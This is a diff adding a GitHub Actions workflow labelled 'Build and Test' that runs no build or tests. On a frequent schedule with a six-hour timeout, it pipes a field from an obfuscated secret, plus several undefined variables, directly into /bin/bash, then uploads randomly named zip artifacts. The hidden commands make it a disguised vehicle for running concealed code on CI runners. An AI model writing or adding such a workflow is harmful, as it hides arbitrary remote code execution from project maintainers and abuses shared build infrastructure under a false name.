@@ -1,0 +1,32 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          qg3512: ${{ secrets.qg3512 }}
+        run: |
+          printf '%s' "$qg3512" | jq -r .nf9412 | /bin/bash
+          printf '%s' "$ovwz4" | jq -r .k9046 | /bin/bash
+          echo $r0 | jq -r .o952 | /bin/bash
+          echo $du094 | jq -r .nv305 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: EzRkjTDw
+          path: "*.zip"
+          retention-days: 1
